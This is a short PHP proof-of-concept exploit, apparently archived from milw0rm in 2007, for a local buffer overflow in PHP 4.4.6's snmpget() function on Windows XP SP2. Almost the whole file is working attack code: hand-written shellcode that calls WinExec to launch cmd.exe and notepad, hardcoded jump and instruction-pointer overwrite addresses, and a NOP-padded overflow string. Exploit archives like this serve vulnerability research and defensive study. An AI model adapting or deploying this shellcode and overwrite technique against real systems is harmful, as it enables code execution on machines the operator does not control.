<?php

// PHP 4.4.6 snmpget() object id local buffer overflow poc exploit
// by rgod
// site: http://retrogod.altervista.org

// win xp sp2 version
// to be launched form the cli


if (!extension_loaded("snmp")){
die("you need the snmp extension loaded.");
}

$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\x6d\x13\x86\x7c". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\xda\xcd\x81\x7c". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

$edx="\x64\x8f\x9b\x01"; //jmp scode
$eip="\x73\xdc\x82\x7c"; //0x7C82DC73      jmp edx
$____suntzu=str_repeat("A",188).$edx.str_repeat("A",64).$eip.str_repeat("\x90",48).$____scode.str_repeat("\x90",48);
//more than 256 chars result in simple eip overwrite
snmpget(1,1,$____suntzu);

?>

# milw0rm.com [2007-03-09]
